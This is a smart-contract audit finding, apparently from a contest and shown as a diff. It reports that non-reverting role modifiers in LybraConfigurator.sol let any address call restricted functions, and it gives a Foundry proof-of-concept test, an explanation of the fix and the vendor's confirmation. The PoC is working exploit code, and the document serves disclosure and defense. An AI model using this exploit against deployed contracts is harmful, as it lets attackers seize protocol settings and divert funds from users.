@@ -1,0 +1,15 @@
+[H-03] Incorrectly implemented modifiers inLybraConfigurator.solallow any address to call functions that are supposed to be restricted
+Submitted byalexweb3, also found byD_Auditor,josephdara,TorpedoPistolIXC41,zaggle,koo,cartlex_,hals,mladenov,Neon2835,Neon2835,lanrebayode77,Silvermist,pep7siup,Musaka,Timenov,Timenov,LuchoLeonel1,mahyar,mrudenko,DedOhWale,adeolu,zaevlad, andDelerRH
+The modifiersonlyRole(bytes32 role) andcheckRole(bytes32 role) are not implemented correctly. This would allow anybody to call sensitive functions that should be restricted.
+Proof of Concept
+For the POC, I set up a new foundry projects and copied the folders lybra, mocks and OFT in the src folder of the new project. I installed the dependencies and then I created a filePOCs.t.solin the test folder. Here is the code that shows a random address can call sensitive functions that should be restricted:
+// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.13;import"forge-std/Test.sol";import"../src/lybra/configuration/LybraConfigurator.sol";import"../src/lybra/governance/GovernanceTimelock.sol";import"../src/lybra/miner/esLBRBoost.sol";contractPOCsTestisTest{ConfiguratorpubliclybraConfigurator;GovernanceTimelockpublicgovernance;esLBRBoostpublicboost;addresspublicdao=makeAddr("dao");addresspubliccurvePool=makeAddr("curvePool");addresspublicrandomUser=makeAddr("randomUser");addresspublicadmin=makeAddr("admin");addresspubliceusd=makeAddr("eusd");addresspublicpEusd=makeAddr("pEusd");addressproposerOne=makeAddr("proposerOne");addressexecutorOne=makeAddr("executorOne");address[]proposers= [proposerOne];address[]executors= [executorOne];addresspublicrewardsPool=makeAddr("rewardsPool");functionsetUp()public{governance=newGovernanceTimelock(10000,proposers,executors,admin);lybraConfigurator=newConfigurator(address(governance),curvePool);boost=newesLBRBoost();}functiontestIncorrectlyImplementedModifiers()public{console.log("EUSD BEFORE",address(lybraConfigurator.EUSD()));vm.prank(randomUser);lybraConfigurator.initToken(eusd,pEusd);console.log("EUSD AFTER",address(lybraConfigurator.EUSD()));console.log("RewardsPool BEFORE",address(lybraConfigurator.lybraProtocolRewardsPool()));vm.prank(randomUser);lybraConfigurator.setProtocolRewardsPool(rewardsPool);console.log("RewardsPool AFTER",address(lybraConfigurator.lybraProtocolRewardsPool()));}}
+Tools Used
+Manual Review
+Recommended Mitigation Steps
+Wrap the 2 function calls in a require statement:
+In modifieronlyRole(bytes32 role), instead ofGovernanceTimelock.checkOnlyRole(role, msg.sender), it should be something like require (GovernanceTimelock.checkOnlyRole(role, msg.sender), “Not Authorized”).
+The same goes for thecheckRole(bytes32 role) modifier.
+Assessed type
+Access Control
+LybraFinance confirmed
